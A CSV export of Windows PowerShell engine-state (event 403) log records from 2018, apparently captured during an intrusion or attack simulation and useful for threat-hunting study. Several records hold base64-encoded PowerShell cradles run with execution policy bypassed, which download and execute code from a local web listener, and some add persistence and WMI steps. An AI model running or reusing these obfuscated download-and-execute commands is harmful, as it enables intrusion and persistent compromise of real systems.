TimeCreated,Details,EventID
9/6/2018 23:20,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=45

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=11020f84-5c63-402f-8eff-299ecdde31d7
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=fd302d68-58aa-47b0-9e5d-e132b6bbd0b0
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
9/6/2018 19:26,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=23

	HostName=ConsoleHost
	HostVersion=1.0
	HostId=ac974e29-6dff-45d1-a025-be7b47d54066
	HostApplication=C:\WINDOWS\system32\rundll32.exe
	EngineVersion=5.1.16299.547
	RunspaceId=b13bf80c-a30f-4295-87c8-dc7659c82e2e
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
9/6/2018 16:58,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=23

	HostName=ConsoleHost
	HostVersion=1.0
	HostId=ef6cd434-cedc-4962-af75-a7679eac5567
	HostApplication=C:\WINDOWS\system32\rundll32.exe
	EngineVersion=5.1.16299.547
	RunspaceId=ec0f0c1b-9fe9-4adf-8217-00e5ffc4a08b
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
9/6/2018 15:40,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=43

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=be5b2c2e-be18-47bc-81f0-35a1afaf7228
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=437c9179-6d27-4d76-b3bd-98c585ebf496
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
9/6/2018 15:09,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=45

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=bf64d975-c396-48e4-b9b0-36b1e6b773ea
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=72099b4b-9acf-4cde-af39-f2ec920c98a9
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
9/5/2018 15:38,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=45

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=d447fcab-e591-4893-9b5a-fa85294cc14e
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=23aec0c7-256e-4f67-85fd-9c39f894aec5
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
9/5/2018 15:36,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=43

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=f7b49f17-53e8-4e68-ad14-8b536335e8e9
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=7869143d-e04d-44aa-b372-9062acc41c75
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
9/5/2018 14:11,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=67

	HostName=ConsoleHost
	HostVersion=5.1.16299.547
	HostId=1d3b032d-5f20-4776-b135-f7ad4123c73c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=5.1.16299.547
	RunspaceId=36d05217-4cfe-450e-bb99-9e7b83db2277
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
9/5/2018 14:01,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=56

	HostName=ConsoleHost
	HostVersion=1.0
	HostId=2787da92-cd98-4062-a3e8-8f8a4d766b49
	HostApplication=C:\WINDOWS\system32\rundll32.exe
	EngineVersion=5.1.16299.547
	RunspaceId=b0bc5e93-a54f-41d1-8aa1-9d16e3c296b9
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
9/5/2018 0:04,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=45

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=f054ae63-048f-42d0-862a-ff36da0eb4c6
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=1b7c833d-5705-45ce-af87-c64eb29441c6
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
9/5/2018 0:03,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=43

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=84b79ac0-faed-4e92-a0d8-4d5d0b43b648
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=82476314-0d1e-4487-88bb-dcc1fff86238
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
9/3/2018 15:44,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=45

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=4cc2edb4-41e1-4dac-a22f-f9bbfd2d5f6c
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=67b8d014-323a-4526-ac56-f535ac9de06a
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
9/3/2018 15:41,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=43

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=908a819d-2504-472d-9a24-f1c570b346b2
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=06b0ba06-3264-4171-92c5-c302e6a79d4a
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
9/1/2018 19:41,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=43

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=4b345c7c-892a-4b42-8dc1-10d8d2ff98d2
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=8eb3f19e-9e88-470a-8387-371db03f8a6d
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
9/1/2018 19:25,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=45

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=d30b5c07-b707-4c04-8ca0-2ec576200199
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=5bd91e93-290f-46a0-8b26-dd8d15177535
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/31/2018 20:08,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=45

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=a351092b-d2fc-45c5-9208-65bb99615142
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=d2cb2c1c-14cc-43f2-8fa5-e46bb9bf8415
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/31/2018 18:01,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=43

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=9d7fedd8-e1e2-47a7-bf05-a1d778d184ad
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=9e2b4683-13a8-4a77-95d6-7cf898652b24
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/31/2018 3:31,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=31

	HostName=ConsoleHost
	HostVersion=5.1.16299.547
	HostId=1d0dbb4e-2505-44ea-9830-9ff8ba056940
	HostApplication=powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQA6ADUAOQA5ADUANQAvACcAKQApAA==
	EngineVersion=5.1.16299.547
	RunspaceId=d45455b4-979f-4187-adb0-fa56e0688fb8
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/31/2018 3:23,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=31

	HostName=ConsoleHost
	HostVersion=5.1.16299.547
	HostId=1dbda3f5-fab4-4a4b-b3c8-a0479fa6d937
	HostApplication=powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQA6ADIAMwA5ADkAMwAvACcAKQApAA==
	EngineVersion=5.1.16299.547
	RunspaceId=9566b5c9-a1de-4b1f-b111-873a77dbbfe8
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/31/2018 3:14,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=31

	HostName=ConsoleHost
	HostVersion=5.1.16299.547
	HostId=f8da00fd-8121-4cbe-a375-b81031daee00
	HostApplication=powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQA6ADMAMgA4ADYANQAvACcAKQApAA==
	EngineVersion=5.1.16299.547
	RunspaceId=e38db2e4-a3ef-4666-949d-f9701cc1713a
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/31/2018 2:55,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=31

	HostName=ConsoleHost
	HostVersion=5.1.16299.547
	HostId=5ba41c00-6cd0-497f-acb1-8fb3041cda00
	HostApplication=powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQA6ADEAOAA0ADYANAAvACcAKQApAA==
	EngineVersion=5.1.16299.547
	RunspaceId=b809ce77-6b7b-47e3-939d-820897e7184c
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/31/2018 2:08,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=31

	HostName=ConsoleHost
	HostVersion=5.1.16299.547
	HostId=e35d6055-a1e5-4c0f-812c-bd985d4e209e
	HostApplication=powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQA6ADQANQA1ADQAOAAvACcAKQApAA==
	EngineVersion=5.1.16299.547
	RunspaceId=7b2b13dc-496e-47c1-b58f-a24203c3fd52
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/31/2018 2:06,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=31

	HostName=ConsoleHost
	HostVersion=5.1.16299.547
	HostId=0e07f97e-96aa-4a3b-8f59-34b49b201104
	HostApplication=powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQA6ADQAMQA2ADEANAAvACcAKQApAA==
	EngineVersion=5.1.16299.547
	RunspaceId=db7d2211-c023-49c2-8021-379649a9cfd2
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/31/2018 0:45,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=31

	HostName=ConsoleHost
	HostVersion=5.1.16299.547
	HostId=b8c18767-c4f2-42e1-ba6a-042f782f0c76
	HostApplication=powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQA6ADQAMwAxADQAMwAvACcAKQApAA==
	EngineVersion=5.1.16299.547
	RunspaceId=c6c7e4e2-bbaa-41a6-9e9f-6be2187e7e2b
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/30/2018 23:40,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=69

	HostName=ConsoleHost
	HostVersion=1.0
	HostId=9da4ff8d-a65e-4c7f-b24d-9798d2be3800
	HostApplication=C:\WINDOWS\sysnative\rundll32.exe
	EngineVersion=5.1.16299.547
	RunspaceId=c4be820a-eea8-4967-b91c-f7308eb6de21
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/30/2018 23:40,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=35

	HostName=ConsoleHost
	HostVersion=1.0
	HostId=88366754-b751-448c-92e0-59140a7e9025
	HostApplication=C:\WINDOWS\sysnative\rundll32.exe
	EngineVersion=5.1.16299.547
	RunspaceId=be1daed9-4950-4cd4-8bb8-62e67809d833
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/30/2018 20:31,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=47

	HostName=ConsoleHost
	HostVersion=5.1.16299.547
	HostId=421ce163-4e1f-48ec-a651-f3147d416be2
	HostApplication=powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgA1ADQANwAwADkALwAnACkAOwAgAEkAbgBzAHQAYQBsAGwALQBQAGUAcgBzAGkAcwB0AGUAbgBjAGUA
	EngineVersion=5.1.16299.547
	RunspaceId=8387832f-b2e3-40df-ad79-6f8644ce35c4
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/30/2018 20:31,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=41

	HostName=ConsoleHost
	HostVersion=5.1.16299.547
	HostId=e3276eb3-8d52-42e5-80fc-4ac9701ddfe4
	HostApplication=powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgA0ADAAOQAyAC8AJwApADsAIABjAGgAZQBjAGsALQBXAE0ASQA=
	EngineVersion=5.1.16299.547
	RunspaceId=380d114b-6db5-4422-b414-cc2cc323d57b
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/30/2018 15:13,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=43

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=23533ed5-cedf-400d-b374-d29c07434c59
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=e9c1f61d-407b-463c-9e13-8f7e900867fe
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/30/2018 7:17,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=107

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=eb73d381-df9b-4076-bcb9-304dbad22dcb
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=d91de75e-484d-4828-8292-58f397301d56
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
8/30/2018 6:16,"	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=47

	HostName=ServerRemoteHost
	HostVersion=1.0.0.0
	HostId=77402a3f-fa06-4190-94f9-ece60245e2f4
	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
	EngineVersion=5.1.16299.547
	RunspaceId=992479c3-ddb2-49f4-a145-be7c84f6b3f9
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",403
